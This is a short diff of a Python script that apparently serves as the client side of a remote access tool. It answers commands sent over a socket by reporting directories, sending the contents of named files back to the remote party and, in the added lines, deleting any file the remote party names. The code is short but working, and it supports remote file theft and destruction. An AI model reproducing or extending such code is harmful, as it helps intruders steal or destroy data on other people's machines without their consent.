@@ -18,7 +18,7 @@ while 1:
         files = os.getcwd()
         files = str(files)
         client_socket.send(files.encode())
-        print("Command view_cwd sent correctly!")
+        print("Command view_cwd executed correctly!")
     
     elif command == "custom_dir":
         user_input = client_socket.recv(5000)
@@ -27,7 +27,7 @@ while 1:
         files = str(files)
         
         client_socket.send(files.encode())
-        print("Command custom_dir sent correctly!")
+        print("Command custom_dir executed correctly!")
 
     elif command == "download_files":
         filepath = client_socket.recv(5000)
@@ -35,7 +35,13 @@ while 1:
         files = open(filepath, "rb")
         data = files.read()
         client_socket.send(data)
-        print("File sent correctly!")
+        print("Command download_files executed correctly!")
+    
+    elif command == "remove_files":
+        filepath = client_socket.recv(5000)
+        filepath = filepath.decode()
+        files = os.remove(filepath)
+        print("Command remove_files executed correctly!")
 
     else:
         print("Leave")
